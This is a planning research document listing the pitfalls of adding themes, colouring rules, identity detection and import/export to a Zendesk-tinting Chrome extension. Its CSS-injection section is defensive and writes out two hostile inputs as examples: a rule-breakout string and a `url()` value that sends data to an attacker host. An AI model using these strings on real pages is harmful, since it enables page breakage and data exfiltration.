# Pitfalls Research

**Domain:** Adding dark-mode themes, colour-slot palettes, AND/OR colouring rules, "assignee is me" identity detection, an options page and local export/import to a published, `storage`-only MV3 extension (Zhroma 0.1.0 → 1.0.0) that reads Zendesk's rendered DOM
**Researched:** 2026-09-25
**Confidence:** MEDIUM overall. Chrome Web Store policy claims were fetched from developer.chrome.com today and are quoted with each page's own "last updated" date. The GSD `classify-confidence` seam tiers every single-fetch web source as LOW, so every policy row below carries LOW as its seam tier, even where the text is first-party and quoted word for word. Zendesk dark-mode and identity DOM facts are **unverified**: Zendesk documents no DOM contract. The tint-readability numbers were computed locally (method under Sources) and depend on stated assumptions about Zendesk's colours.

**Scope note.** This builds on `.planning/milestones/v1.0-research/PITFALLS.md` and does not repeat it. The v1 pitfalls on selector fragility, MutationObserver misuse, locale, scope creep and store rejection all still apply. This file covers what goes wrong when *these* v1.1 features are added to *this* verified codebase.

**Two corrections to v1 research that v1.1 must plan around:**
1. v1 research recommended translucent `background-image` so that Zendesk's own `background-color` states show through. The shipped `extension/zhroma.css` does something else: it sets **`background-color: rgb(… / 0.08–0.14) !important` on `td[data-garden-id="tables.cell"]`**, gated on `html[lang|="en" i]`. So the tint *replaces* the cell's own background rather than compositing over it. Hover and selected states were accepted only in the light interface (Phase 02). Dark mode has never been checked against the shipped approach.
2. v1 research framed dark mode as "light tints make text unreadable". The computation below shows that the real failure at the shipped alphas is the opposite one. **On Zendesk's dark background the tints nearly vanish, and adjacent priorities stop being distinguishable.** Text contrast stays high. The dark-mode problem is losing the one-second glance test, not losing legibility.

---

## Damage Ranking

| # | Pitfall | Probability | Severity | Phase |
|---|---------|-------------|----------|-------|
| 1 | New data practice (stored agent name, rule values, identity crossing contexts) shipped without matching policy, listing, dashboard and in-product disclosure | High | Delisting or rejection; breaks the project's own honesty rule | Release + Identity |
| 2 | Regressing the verified 0.1.0 priority path while generalising column resolution, and reopening every human check | Very high | Silent loss of the core value; unbounded re-verification cost | Foundation (first) |
| 3 | Settings writes race each other, or break the worker's single-writer `enabled` path | High if naive | Lost settings, a switch that inverts itself, "update changed my extension" | Foundation |
| 4 | Theme palettes that vanish or merge on dark backgrounds, and a colourblind preset that collapses once blended | High | Fails the glance test in exactly the mode v1.1 promises to fix | Themes |
| 5 | Dark-mode detection keyed to the wrong signal, or blind to a mid-session switch | High | Wrong variant for hours; silent | Themes (recon gate) |
| 6 | Import or theme strings interpolated into CSS: injection, exfiltration through `url()`, a broken zero-network claim | Medium | Security incident; policy violation | Themes + Import |
| 7 | Identity detection that picks the wrong "me" | Medium | Actively misleading highlights | Identity |
| 8 | Rule engine semantics that don't match what agents see (normalisation, empty, dates, duplicates, group rows) | High | Rules "don't work"; support burden | Rules |
| 9 | Adding a permission with a warning (`downloads`, `clipboardWrite`, `tabs`) disables the extension for every existing user | Low if warned | Catastrophic for installs | All phases |
| 10 | Full nested AND/OR editor that non-technical agents cannot use | High | Feature unused or misconfigured | Options UI |

---

## Critical Pitfalls

### Pitfall 1: The data practice changes, but the disclosures, policy and consent story stay at 0.1.0

**What goes wrong:**
Everything public about Zhroma currently says it stores **exactly one boolean**:
- the live privacy policy: "Zhroma stores exactly one thing: whether tinting is switched on or off … No ticket, customer, view, account or usage information is stored";
- the listing: "Zhroma stores exactly one thing";
- the dashboard justification and `release/disclosures.md`: "Exactly one boolean under one key";
- the diagnostics invariant: "The only value crossing between content script, worker and popup is a finite enum, never page text".

v1.1 falsifies all four:
- an **agent name** (Personally Identifiable Information, which FAQ Q4 lists as "a person's name … username") is read from the page and stored;
- **rule values** are stored, and they can be agent names, requester or organisation names, or custom field values;
- an identity string, and possibly the view's column names, now **cross from content script to extension pages**.

The published policy also makes a promise of its own: *"If Zhroma's data practices ever change, this page will be updated before the change ships."* Automatic publication after approval was enabled for 0.1.0. If the same happens for 1.0.0, the new code can reach users before the policy changes, and the policy is then false.

**Why it happens:**
The team sees the features as "local only, so nothing changes". The Chrome text says otherwise:
- Program Policies (last updated 2025-05-22): *"If an extension introduces different user data practices after installation, the extension must prominently disclose data practice changes."* The same text is in the Disclosure Requirements page (2022-11-01).
- Program Policies: *"you must post an accurate and up to date privacy policy"*, and contradictions between disclosures and behaviour can lead to removal.
- User Data FAQ Q3 and Q14: local-only handling still needs disclosure and a policy.

This is the same failure that delisted the predecessor extension, and it is recorded in v1 research.

**How to avoid:**
1. **Make every new data practice opt-in, and put the disclosure at the moment of opt-in.** This is what keeps "existing users see zero change" true for data practices as well as visuals, and it closes the consent question *for the new data* without touching zero-config:
   - Identity detection **does not run** unless the agent has created a rule that uses "assignee is me". A user with no such rule has no identity read, stored or sent.
   - When the agent adds the first "is me" condition, the options page shows a plain in-product notice before anything is read. Suggested wording: "Zhroma will read your name from the Zendesk page and keep it on this device only." The agent must take an explicit action, such as a "Use my name" button. That is the "specific action clearly agreeing" wording in FAQ Q10, placed "within the Product's user interface".
   - The rules editor carries a standing one-line notice: "Rules are stored on this device only and may contain names you type."
2. **Do not persist auto-detected identity.** Detect it in the content script at run time, keep it in memory, and use it there. Persist only a name the agent has typed or explicitly confirmed. "Stores only what you typed or confirmed" is much easier to disclose than "stores what we scraped".
3. **Keep identity inside the content script by default.** "Is me" can be evaluated where the DOM is, so the name never needs to leave. Show the detected name in the options page only when the agent asks for it (for example "Show detected name"). Record the exception to the finite-enum invariant explicitly in `release/disclosures.md` rather than letting it lapse quietly.
4. **Rewrite the four documents together, in this order, before submitting:**
   - `release/privacy/index.html`: what is stored (theme choice, rules, an optional confirmed name), where (`chrome.storage.local`, unencrypted, on this device, cleared on uninstall), what export writes (a file only when asked), and that sync is not used. Write it so it is true for both 0.1.0 and 1.0.0 users during rollout, for example "From version 1.0.0 …".
   - `release/listing.md`: remove "stores exactly one thing" and "Dark mode is not supported in this version".
   - `release/disclosures.md`: the source-fact rows.
   - the dashboard Privacy tab: data categories and the single-purpose text.
   Re-publish the policy and repeat the anonymous-HTTPS byte-match (`policy-publication.json`).
5. **Turn off automatic publication for 1.0.0.** Use deferred publishing ("you will have up to 30 days to publish", per the Update page, 2020-12-03). Publish the policy first, verify it, then publish the item. This is the only way to keep the "updated before the change ships" promise.
6. **Re-answer the dashboard data categories honestly.** 0.1.0 declared "Website content". A stored agent name is a strong candidate for **Personally identifiable information**. The exact dashboard labels were never recorded (disclosures.md §3 still lists them as unseen). Read them in the live dashboard and decide against that wording. Consistency with the project's own rule, "Do not select 'no data collected' merely because the data stays local", points to declaring PII once a name is stored.
7. **Re-open, don't inherit, `release/policy-applicability.md`.** The v1 open question was whether reading page content before any consent step needs in-product consent. v1.1 does not answer it, but it adds a clearer duty: data-practice changes after installation must be prominently disclosed. The opt-in design above satisfies that duty for the new data under the strict reading. The original question about reading the Priority cell stays open and stays exactly as it was. Record both in the file, with dates.

**Warning signs:**
- The phrase "exactly one" survives anywhere in `release/` after rules land.
- Identity detection code runs when `rules` is empty.
- An identity or header string appears in a `chrome.runtime.sendMessage` payload without a matching disclosures.md row.
- 1.0.0 is submitted with "publish automatically after review" ticked.
- The dashboard's data categories are unchanged from 0.1.0.

**Phase to address:** Identity phase (opt-in gating, in-memory detection) and Release phase (documents, dashboard, deferred publish). The opt-in design must be decided *before* the identity code is written, because it decides where detection runs.

---

### Pitfall 2: Generalising column resolution regresses the verified priority path, and every human check reopens

**What goes wrong:**
v1's priority path rests on a small set of verified behaviours:
- exactly one header whose trimmed `textContent === 'Priority'`, with duplicates treated as ambiguous;
- `PRIORITY_LABELS` exact match, with blank allowed;
- `data-zhroma-priority` values written only when they differ;
- the `html[lang|="en" i]` gate encoded in both JS and CSS and kept in step by an agreement test;
- a 100 ms mutation-quiet window before the "missing column" hint;
- `INTERPRETATION_ATTRIBUTES` plus the expected-marker map that stops self-retriggering;
- a measured slowest 30-row median of **1.3 ms**.

The natural refactor turns "find the Priority column" into "resolve any column by name" and routes Priority through the new rule engine. That quietly changes:
- the ambiguity rule;
- the normalisation, where a rule-grade `toLowerCase`/whitespace-collapse accepts "urgent " or "URGENT", which v1 deliberately rejects;
- the diagnosis mapping, because `missing` now means "no Priority column", which is no longer the same thing as "nothing to tint";
- the order of attribute writes.

Each change is individually defensible, and together they are a different product. Because **evidence binds to bytes**, any edit to `content.js` or `zhroma.css` invalidates the pinned-blob acceptance anyway. The project pays the full re-verification cost *and* ships a changed priority path.

Specific collisions to expect:
- **Diagnosis semantics.** A view with no Priority column but a matching rule is now useful. v1 would still publish `missing` ("Add a Priority column to this view to use tinting") while rules are tinting rows, so the toolbar contradicts the screen.
- **The English gate.** Rules on user-typed values could work in any language, which is a tempting reason to drop `html[lang|="en" i]`. That silently changes the verified `cannot-read:unsupported-language` behaviour and the CSS/JS agreement test.
- **New row attributes.** A new attribute such as `data-zhroma-rule` or `data-zhroma-mark` that is *added to* `INTERPRETATION_ATTRIBUTES` without an expected-marker entry makes the observer retrigger itself: an infinite reconcile loop. One that is *left out* is invisible when Zendesk re-renders and strips it, so marks disappear until the next unrelated mutation.
- **Contract tests.** `test/extension/runtime-contract.test.js` pins the manifest (`minimum_chrome_version: '106'`, `permissions: ['storage']`), the eleven-file shipped inventory (`scripts/release-source.js`), exactly four `background-color` hues, and forbids `@`, `url(`, `box-shadow`, `font` and `opacity` in `zhroma.css`. Options, themes and stripes break these tests. The failure mode is "edit the test until it passes", which deletes the guards that matter (no `url(`, `storage` only) along with the ones that were v1-specific.

**Why it happens:**
Generalisation feels like cleanup. Nobody decides to regress Priority. It happens as a side effect of sharing code.

**How to avoid:**
1. **Keep Priority as a separate, byte-stable code path.** Put the rule engine in a new file (for example `rules.js`) that runs *after* the priority snapshot and only when at least one rule exists. With zero rules, the content script's observable behaviour — attributes, diagnosis, timing, storage reads beyond one additional `get` — must match 0.1.0.
2. **Build a differential "0.1.0 parity" test before any feature code.** Run the pinned 0.1.0 blobs and the working tree against the three admitted fixtures, plus mutation sequences taken from the Phase 3 and Phase 4 suites, with default settings. Compare row attributes, published diagnoses and computed cell backgrounds in light mode. This is what makes the reopened human checks *cheap to re-close*: the parity test carries the behavioural claim, and the human re-check shrinks to "does it still look the same live".
3. **Split the contract test deliberately, not by editing assertions:**
   - **Frozen invariants**, which never change: permissions exactly `['storage']`, no `host_permissions`, no network APIs, no `url(` in any shipped CSS, the match pattern, `all_frames: false`.
   - **v1.0-specific pins**, versioned and retired with a written reason: four hues, the eleven-file inventory, no `box-shadow`.
4. **Decide the diagnosis changes in REQUIREMENTS, with exact copy,** before building. Suggested rule: with zero rules the diagnoses are unchanged. With rules, "working" also covers "a rule tinted rows", and the "Add a Priority column" hint shows only when no rule matched any row *and* Priority is absent.
5. **Keep the English gate for 1.0.0** and record it as a scope decision. Localised rules are a separate decision.
6. **Register every new owned attribute in the expected-marker mechanism** and test that writing it does not retrigger the observer. The existing mutation-registry tests are the template.
7. **Re-run the performance harness** with zero rules (must match 1.3 ms within noise) and with a stated worst-case rule set.

**Warning signs:**
- `inspectCandidateTable` gains a parameter.
- `PRIORITY_LABELS` becomes a case-insensitive lookup.
- `runtime-contract.test.js` is edited in the same commit as feature code.
- No test compares against 0.1.0 bytes.
- The `missing` title appears in a screenshot where rows are tinted.

**Phase to address:** **Foundation phase, first.** The parity harness and the contract split come before any theme or rule code. Every later phase's verification plan should name which reopened v1 checks it re-closes and how.

---

### Pitfall 3: Storage writes race each other, and the single-writer `enabled` path gets folded into a settings blob

**What goes wrong:**
0.1.0's `background.js` is the *single writer* of one key (`enabled`), with a queue (`preferenceQueue`, `writeEpoch`, bounded hops). The popup "never reads or writes storage itself". v1.1 adds three new writers — the popup theme picker, the options page and import — and the likely designs break in one of these ways:
- **One `settings` object holding `enabled`, `theme`, `rules` and `identity`.** The options page saves rules from a snapshot it read ten minutes ago, which contains the *old* theme and the *old* `enabled`. The theme the agent just picked in the popup is reverted, or the off switch flips back on. `chrome.storage` has no documented transaction or compare-and-swap. The Storage reference (last updated 2026-09-11) says nothing about atomicity across contexts.
- **Moving `enabled` into the new structure.** This rewrites verified worker code and invalidates `worker-integrity`, `toggle`, `preference-outcome` and `popup-recovery` evidence for no user benefit.
- **Seeding defaults on update.** A `chrome.runtime.onInstalled` handler writes `theme: 'default'` and `rules: []`. Now every existing user has a stored snapshot of 1.0.0's defaults, and a later change to the default theme never reaches them. There is also now "stored data" to disclose for users who never opted in.
- **Autosave on every keystroke** in the rule editor. Each `set` fires `storage.onChanged` in *every* open Zendesk tab, and each tab re-compiles rules and re-reconciles. Typing a rule value makes every agent tab reconcile 10 times a second.
- **Startup ordering.** The content script tints with the default palette on its first `enabled` read, then the theme and rules arrive and it re-tints. The result is a visible flash of wrong colours on every load and view entry.
- **Corrupt or partial imports.** A half-valid file is written key by key. The `rules` write succeeds and the `theme` write fails, or the import is interrupted. The stored state is now a mix of two configurations.

**Why it happens:**
The v1 single-writer design is subtle and documented only in comments. A new author sees `chrome.storage.local.set` and uses it directly.

**How to avoid:**
1. **Leave the `enabled` key and its worker path byte-identical.** New settings live under *separate* keys, and each key has exactly one owner:
   - `theme`: written only by the popup, or routed through the worker.
   - `rules` and `identityOverride`: written only by the options page.
   - `schemaVersion`: written only by the migration or import code.
   Keys that don't share writers can't lose each other's updates.
2. **Absence means default. Never seed.** A missing `theme` key renders the 0.1.0 palette, and a missing `rules` key means no rules. Nothing is written until the agent changes something, so fresh installs and 0.1.0 upgrades are identical, stored data included.
3. **Version the schema from the first write:** `schemaVersion: 1` stored alongside the first non-`enabled` key. 0.1.0 wrote no version, so "no `schemaVersion`" means "v0: only `enabled`". Migrations are pure functions with fixture tests. Unknown future versions (for example an import from a newer machine) are refused with a message, never partially applied.
4. **Import is validate → preview → one `set` call → verify.** Parse, validate the *whole* document against the schema, show a diff ("replaces 7 rules and your theme"), then write every key in a single `chrome.storage.local.set({...})` call. Keep the previous values under a `previousSettings` key for one-step undo. Never merge silently.
5. **Save rules explicitly** (a Save button, or a debounce of at least 500 ms after the last edit), never per keystroke. Content scripts compile rules once per `onChanged`, not per row pass.
6. **Read all settings in the content script's first `get`,** in one call alongside `enabled`, before the first positive commit, so the first tint is the right tint. Keep the existing generation logic so a slow read can't overwrite a newer change.
7. **Quota is not the problem; unbounded input is.** `storage.local` is 10 MB in current Chrome (5 MB in Chrome 113 and earlier; `minimum_chrome_version` is 106). Cap the import file size (for example 256 KB), the number of rules (for example 50), the conditions per rule (for example 10) and the string lengths (for example 200). Do not request `unlimitedStorage`: it shows no warning, but it is a permission change and adds review surface for no benefit.

**Warning signs:**
- A key named `settings` or `config` holding more than one concern.
- `onInstalled` writes storage.
- `storage.local.set` called from more than one file for the same key.
- `onChanged` listeners doing work proportional to the number of rows.
- A test that imports half a file and checks "the good half applied".

**Phase to address:** Foundation phase: the schema, key ownership, absence-as-default and the startup read. Options/Import phase: the validate–preview–single-set flow.

---

### Pitfall 4: Editor-theme palettes vanish on dark backgrounds, merge with each other, and the colourblind preset collapses once blended

**What goes wrong:**
Tokyo Night, Catppuccin, Dracula, Nord, Gruvbox and Solarized were designed as **opaque foreground text on their own backgrounds**. Zhroma uses them as **8–14% translucent fills over Zendesk's backgrounds**. Several things break when a well-known palette is dropped into that model:
- **Tints vanish in dark mode.** With the dark background reported as `#151A1E` and text as `#D8DCDE`, 0.1.0's urgent tint at 14% alpha blends to roughly `rgb(49 28 31)`, which is barely off-black.
- **Adjacent priorities merge.** Computed perceptual distance (OKLab ΔE×100, where about 2 is a just-noticeable difference for small patches) between the *closest pair* of blended priority colours:

  | Palette (as blended) | Light: closest pair | Dark: closest pair | Deuteranopia, light | Deuteranopia, dark |
  |---|---|---|---|---|
  | 0.1.0 as shipped (α 0.14/0.12/0.09/0.08) | 1.9 (Normal/Low) | 2.0 (High/Normal) | 1.3 | **0.6** |
  | Solarized red/orange/yellow/green, α 0.14 | **1.0** (Normal/Low); Urgent/High 1.2 | 1.4 | **0.1** | **0.1** |
  | Dracula, α 0.14 | 2.2 | 2.9 | 0.4 | 0.5 |
  | Dracula, α 0.28 in dark | — | 5.4 | — | 1.0 |
  | Nord aurora, α 0.14 | 1.4 | 1.9 | 1.1 | 1.5 |
  | Okabe-Ito (vermillion/orange/yellow/blue), α 0.14 | 2.4 | 3.2 | 2.1 | 2.8 |
  | Okabe-Ito, α 0.18 light / 0.30 dark | 3.1 | 6.1 | 2.7 | 5.2 |

  Text contrast stayed above 5:1 in every case, dropping to about 5.3:1 at α 0.28–0.30 in dark mode. **Legibility is not the bottleneck. Distinguishability is.**
- **Solarized's red (`#dc322f`) and orange (`#cb4b16`) are nearly the same hue.** Mapped to Urgent and High, the two priorities that matter most become one colour.
- **A "colourblind-safe" preset built from Okabe-Ito swatches is only marginally safe at 14% alpha** (deuteranopia ΔE 2.1). Swatch-level safety does not survive blending. Validate the *blended* result, not the swatch.
- **Yellow slots nearly disappear on white.** A high-luminance hue at low alpha barely shifts a white background. Every theme's "yellow" Normal tint is the weakest tint.
- **No official light variant exists for some presets.** Dracula and Nord are dark-first. Inventing a "light Nord" is a design decision, not a lookup.
- **One alpha for both modes is wrong.** Dark backgrounds need roughly **2× the alpha** to reach the same separation, and that is where text contrast starts to fall. Alpha is a per-mode, per-slot design parameter.
- **Hover and selected states in dark mode.** Shipped CSS *replaces* the cell `background-color` with `!important`. Zendesk's dark hover and selected colours on those cells are overridden. Light-mode acceptance does not transfer.
- **Left-edge stripe marks.** `border-left` changes the table layout, shifting columns and re-laying out 200 rows. An inset `box-shadow` fights Zendesk's focus rings and is currently banned by the contract test. A stripe on the checkbox cell can hide the bulk-select affordance.

**Why it happens:**
Theme names carry trust: "it's Catppuccin, it must look good". The palettes are validated in their native context, and nobody re-validates them after blending onto a foreign background.

**How to avoid:**
1. **Define a preset as blended output, not as a hex list.** Each preset × mode × priority slot stores the *final* `rgb(r g b / a)` to paint, with a separate `light` and `dark` alpha. Derive values from the theme's hues, then tune them against Zendesk's backgrounds.
2. **Ship a palette validator as a test,** using the method in this file, and run it for every preset and both modes:
   - text contrast ≥ 4.5:1 against Zendesk's text colour;
   - closest-pair ΔE ≥ the 0.1.0 light-mode baseline (about 1.9);
   - Urgent/High ΔE clearly above that;
   - each tint's ΔE from untinted ≥ 3;
   - for the colourblind preset, the same thresholds under deuteranopia and protanopia simulation of the *blended* colours.
   Presets that fail don't ship, whatever their name.
3. **Allow a theme's slot mapping to deviate from the theme's own names** where needed. For Solarized, map High to yellow and Normal to something other than green, so that Urgent and High separate. Record each deviation.
4. **For the colourblind preset, carry the order in lightness as well as hue.** Use a blue-to-orange/vermillion axis rather than red/green, with higher alpha than other presets. Consider pairing Urgent with the stripe mark so it isn't hue-only.
5. **Draw the stripe with `background-image`** (for example `linear-gradient(to right, <colour> 4px, transparent 4px)`) on the first *data* cell rather than the checkbox cell. It composites over the tint's `background-color`, changes no layout and does not use `box-shadow`. Confirm the painting cell on a live view.
6. **Re-run the row-state checklist in dark mode** (hover, hover-while-tinted, select one, select all, focus, unread) on every preset. This is a new human check, not a transfer from Phase 02.
7. **The default theme's light values must be byte-identical to 0.1.0** (`rgb(220 38 38 / 0.14)` and so on), not "red-600 from a slot table". Only the *dark* variant is new.

**Warning signs:**
- A preset file holds hex swatches with no alphas.
- Presets have no per-mode alpha.
- Nobody has looked at a 200-row dark-mode view with each preset.
- The colourblind preset was chosen from a named palette and never simulated after blending.
- The stripe uses `border`.

**Phase to address:** Themes phase. The validator and the blended-output data model come before any preset is added. The dark-mode row-state checklist is that phase's human acceptance.

---

### Pitfall 5: Dark-mode detection keyed to the wrong signal, or deaf to a mid-session switch

**What goes wrong:**
Zendesk agents choose **Dark, Light or Match system appearance** from their profile Appearance menu, admins can allow or disallow it, and the conversation pane has its own "View in dark / light" override (Zendesk help). Zendesk's Garden UI sets its colour mode through a React `ThemeProvider` (`colors.base: 'dark'`). **No documented DOM marker exists.** Known failure modes:
- **`prefers-color-scheme`** reports the OS, not Zendesk. An agent on "Dark mode" with a light OS, or "Light" on a dark OS, gets the wrong variant. A community report says "Match system appearance" with an OS set to *auto* stays dark even in daytime, so even the OS-follows case can disagree.
- **Class sniffing** (`.dark`, `[data-theme]`) is version detection under another name, and breaks at Zendesk's next build.
- **Measuring luminance of a Zhroma-painted cell.** `getComputedStyle(td).backgroundColor` returns *Zhroma's own* `!important` tint, not Zendesk's background. A transparent cell returns `rgba(0,0,0,0)`, which a naive luminance function reads as black, and so as dark.
- **Mid-session switch detection is blind.** A styled-components theme swap mostly changes `class` attributes and inserts CSSOM rules through `insertRule`, which creates **no mutation records**. v1's observer uses `attributeFilter: INTERPRETATION_ATTRIBUTES`, which excludes `class`. It will not see the switch. The "fix" of adding `class` or `style` to that document-wide, subtree filter fires on every hover and tooltip in the SPA, destroying the 1.3 ms budget.
- **Flash of the wrong variant** on load and view entry, if detection runs after the first positive commit.

**Why it happens:**
There is no API, so developers reach for the most convenient signal. v1 research already warned against `prefers-color-scheme` and class names. The new trap is measuring the element Zhroma itself paints.

**How to avoid:**
1. **Recon gate first.** On a live tenant, in light, dark and match-system modes, record:
   - whether Zendesk sets CSS `color-scheme` on `html` or the table;
   - which elements change on a switch, and whether they mutate at all;
   - the table's and cells' computed text and background colours.
   Save sanitised fixtures for each mode, and treat this exactly like v1's RECON-01.
2. **Prefer a zero-JS CSS path if Zendesk sets `color-scheme: dark`.** Then `light-dark(<light tint>, <dark tint>)` in the stylesheet switches automatically, mid-session included, with no observer and no flash. Caveats:
   - `light-dark()` needs Chrome 123. `minimum_chrome_version` is 106, so either raise it (users below stay on 0.1.0; a conscious decision) or declare the 0.1.0 value first and the `light-dark()` value second, so that older Chrome drops the invalid declaration and keeps the fallback;
   - the contract test currently bans `@` rules in `zhroma.css`.
3. **Otherwise, detect from a signal Zhroma never paints:** the computed `color` (text) of a header cell or row, not a background. Light text means a dark background. Compute it once per reconcile pass, outside the per-row loop, and cache it.
4. **Trigger re-detection narrowly.** Use a *separate* observer on `document.documentElement` and `document.body` only, with `attributes: true, subtree: false`, plus `matchMedia('(prefers-color-scheme: dark)').onchange` *as a trigger only* (for the match-system case), plus the existing reconcile passes and `visibilitychange`. Never widen the main observer's `attributeFilter`.
5. **Decide the variant before the first positive commit,** so the first tint is already the right variant.
6. **Fail quiet toward the light variant, which is 0.1.0 behaviour,** if the signal is unreadable. Never invent a third state.

**Warning signs:**
- `prefers-color-scheme` used as the source of truth.
- A Zendesk class name in JS or CSS.
- `getComputedStyle(...).backgroundColor` read from a `td` Zhroma tints.
- `'class'` added to `INTERPRETATION_ATTRIBUTES`.
- No dark or match-system fixture.

**Phase to address:** Themes phase, starting with a recon plan (like v1's Phase 01). Research flag: **needs live recon before planning implementation.**

---

### Pitfall 6: Imported or custom colour strings become CSS injection, and potentially network exfiltration

**What goes wrong:**
Custom hex colours and slot overrides can't live in the static `zhroma.css`. They have to reach the page as CSS text through an injected `<style>`, `adoptedStyleSheets` or inline custom properties. If a colour string from storage (often from an **import file a colleague sent**) is interpolated unvalidated:
- `red; } body { display: none } x {` breaks Zendesk entirely;
- `url(https://attacker.example/?q=…)` in a background makes the *page* issue a network request. Combined with attribute selectors (the classic CSS-exfiltration pattern), it can leak rendered values. That breaks the "no network requests of any kind" claim made in the policy, the listing and the dashboard.
- On the options page, rendering imported rule names or values with `innerHTML` is an injection into a privileged extension page. MV3's default extension CSP blocks inline script, but markup injection still allows UI spoofing.
- Rule predicates compiled with `new Function` or `eval`-style code are blocked by the MV3 extension CSP. They also move toward the MV3 "interpreter" concern. The MV3 requirements page (2024-04-03) lists "Building an interpreter to run complex commands fetched from a remote source, even if those commands are fetched as data" as a violation. A local import is not remote, but a future "share rules by URL" feature would be.

**How to avoid:**
1. **Colour values are validated at every boundary** — import, storage read and just before emit — against `^#[0-9a-fA-F]{6}$`. Slot references must come from a closed enum, and alphas are numbers in range. Emit only through a builder that writes `rgb(r g b / a)` from parsed integers, never from the string.
2. **Keep the default theme free of JS.** Put the 0.1.0 values in static `zhroma.css`, for example as `var(--zhroma-urgent, rgb(220 38 38 / 0.14))`. If dynamic injection fails or is removed, the page falls back to 0.1.0 colours, not to nothing.
3. **Keep the "no `url(`" guard** over *all* emitted CSS, extended to the dynamic builder's output. Add a test that feeds hostile import files through the whole pipeline.
4. **Options page rendering uses `textContent` and DOM APIs only.** No `innerHTML` with any stored value.
5. **Compile rules to closures over validated enums**, never to strings. Rules stay declarative, with no expressions, scripts or regex in 1.0.0.
6. **Spike the injection mechanism.** An injected `<style>` is a structural DOM edit in Zendesk's `<head>`, which v1 avoided, and the main observer's `childList` subtree watch will see it. `adoptedStyleSheets` creates no mutation, but Zendesk page code that *assigns* `document.adoptedStyleSheets = [...]` would drop Zhroma's sheet. Whichever is chosen, re-assert it on each reconcile pass. Confidence here is LOW and needs a live check.

**Phase to address:** Themes phase (the emit builder, validation, fallback) and Options/Import phase (the hostile-file test suite, `textContent`-only rendering).

---

### Pitfall 7: Identity detection picks the wrong "me", or breaks silently and keeps using a stale name

**What goes wrong:**
- The agent's name is probably rendered in the top-bar avatar (an `alt` or `aria-label`), or only inside the **profile menu once it is opened**. The second case means it is absent from the DOM until clicked. This is unverified.
- Detection that grabs "the first avatar with a name" can pick up a **requester, a CC, a "last updated by" avatar or a colleague's presence indicator**. "Assignee is me" then highlights someone else's tickets confidently. That is worse than not working.
- The **display name format** in the top bar can differ from the one in the Assignee column: full name vs. shortened, alias, trailing pronouns or emoji, NBSP.
- **Two agents with the same name** both match. Agents on **several Zendesk subdomains** have different identities per tenant, and keying storage by subdomain means *storing a list of tenants visited*, which is closer to web-history data.
- When grouped by assignee, the Assignee value may appear only in group rows, which v1 correctly skips, so the rule never fires. Unverified.
- The shortcuts: running a script in the **MAIN world** to read Zendesk's JS globals (`currentUser`), or calling **`/api/v2/users/me.json`** from the content script. That call is same-origin with cookies, so it needs no extra permission, and it is still a network request. It breaks the zero-network claim and the "no API" decision in PROJECT.md.

**How to avoid:**
1. **Recon gate:** find the identity source on live tenants, including where it renders, whether it's lazy, and its exact format compared with the Assignee cell. Admit a sanitised fixture.
2. **Detect only from one designated source. If the result is not exactly one clean candidate, detect nothing.** Show "not detected, type your name" instead. Never guess.
3. **A manual override always wins.** Show the detected value with its origin ("detected from the Zendesk page on this tab") so a wrong detection is visible and correctable.
4. **Compare after normalisation** (NFC, NBSP to space, collapsed whitespace, case-folded with `toLowerCase()` rather than `toLocaleLowerCase()`). No substring matching for identity: "Alex" must not match "Alexandra".
5. **No MAIN-world scripts and no Zendesk API calls. Ever.** Add a test asserting that `world` is `ISOLATED` and that no `fetch` or `XMLHttpRequest` exists.
6. **One identity, not a map keyed by tenant,** for 1.0.0. The rare multi-tenant agent can type an override.
7. **Identity detection failure is not a new diagnosis state.** The rule is simply inactive, and the options page says so.

**Phase to address:** Identity phase. Research flag: **needs live recon** (where the name renders, and its format compared with the Assignee column).

---

### Pitfall 8: Rule semantics that don't match what agents see in the cell

**What goes wrong:**
Rules compare a user-typed value with a cell's `textContent`, and cell text is messier than it looks:
- **Normalisation.** NBSP, doubled spaces, trailing whitespace, case, Unicode composed vs. decomposed forms. `toLocaleLowerCase()` gives the Turkish dotless-i surprise, so use `toLowerCase()`.
- **"Empty" isn't empty.** An unassigned Assignee may render "—", "-" or "Unassigned". Checkbox custom fields may render an icon with only an `aria-label`, so text is empty while the value is "true". Visually hidden accessibility text ("Status: Open") makes `equals` fail.
- **Relative dates.** "2 hours ago" and "Yesterday" change over time. `equals` on them is meaningless. They also produce characterData mutations as they tick, which v1's observer treats as relevant, so every tick triggers a reconcile.
- **Truncation.** CSS ellipsis keeps the full `textContent`, but JS truncation ("Long subj…") does not.
- **Duplicate header names.** A custom field named "Status" or "Priority" next to the system column. v1 treats duplicate Priority headers as ambiguous; the rule engine must do the same, per condition, and make it visible.
- **Admin renames a custom field.** Every rule on that header name goes inactive silently.
- **Columns not in the current view.** The rule silently does nothing in that view.
- **Group rows** (`tr[data-garden-id="tables.group_row"]`) have different cells. Applying rules to them paints group headers.
- **`not equals` on an empty or missing cell:** true or false? It is undefined unless decided.
- **Replace vs. mark:** "first matching replace-rule wins" is specified, but **mark stacking** is not. If two mark-rules match, is it one stripe (which?) or two? It is also unspecified whether a replace-rule may hide **Urgent**. An agent's "Pending → blue" rule would quietly remove the red that is the product's core value.
- **Regex and ReDoS.** "Contains" grows into "matches pattern", and one catastrophic pattern from an import freezes a Zendesk tab, because content scripts share the page's main thread.

**How to avoid:**
1. **Specify an operator truth table in REQUIREMENTS,** including missing column, empty cell and each operator. Recommended:
   - a condition on a column absent from the view is *false* and flagged;
   - `not equals` on an empty cell is *true*;
   - `is empty` means trimmed text is empty *or* equals a small list of known placeholders confirmed in recon.
2. **Column identity is exact trimmed header text.** A name that matches no header, or more than one, makes that condition unresolvable. Unresolvable is not false-and-silent: the options page shows a per-rule status ("column not in this view") through a **finite enum** from the content script, never header text.
3. **Skip group rows.** Reuse v1's `GROUP` handling.
4. **Warn on date-like columns.** Offer `is empty` / `is not empty` only for known date columns (Created, Updated, Due date, Requested). Do not attempt relative-date parsing in 1.0.0.
5. **Define mark precedence:** one stripe per row, the first matching mark-rule wins, just like replace. Say it in the UI.
6. **Guard Urgent.** When a replace-rule would override an Urgent row, keep Urgent's tint, or at least warn in the editor and suggest "add a mark" instead. Decide this in REQUIREMENTS, because it touches the core value.
7. **No regex in 1.0.0.** If added later: linear-time matching only, and a length cap.
8. **Performance by construction:**
   - compile rules once per `onChanged`;
   - resolve header indexes once per pass;
   - read `textContent` only for referenced columns (reading it is a DOM traversal, and it is where the cost is);
   - short-circuit AND/OR;
   - skip the engine entirely when `rules` is empty.
   Budget: zero-rule median equal to 1.3 ms, and a stated cap for 50 rules × 10 conditions × 30 rows, measured with the existing Phase 3 harness.

